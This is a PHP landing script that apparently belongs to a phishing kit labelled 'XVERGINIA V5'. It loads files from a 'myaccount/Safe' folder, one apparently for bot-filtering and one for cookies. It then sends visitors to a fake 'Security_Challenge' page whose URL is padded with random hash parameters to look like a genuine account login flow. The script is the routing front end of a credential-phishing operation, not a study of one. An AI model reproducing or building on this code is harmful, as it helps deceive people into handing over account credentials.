<?php

include('myaccount/Safe/xanbbx.php');
include('functions/Config.php');
require_once('myaccount/Safe/cookies.php');

/*   
 
                              #=======================#
                              #    XVERGINIA V5       #
                              #=======================#
							  
*/

	if ($use_capatcha == "yes" )
{
header ("location:myaccount/Auth/Follow/Security_Challenge/?enc=".md5(microtime())."&p=0&dispatch=".sha1(microtime())."");
}	
else
{
	header ("location:indexx.php");
}
?>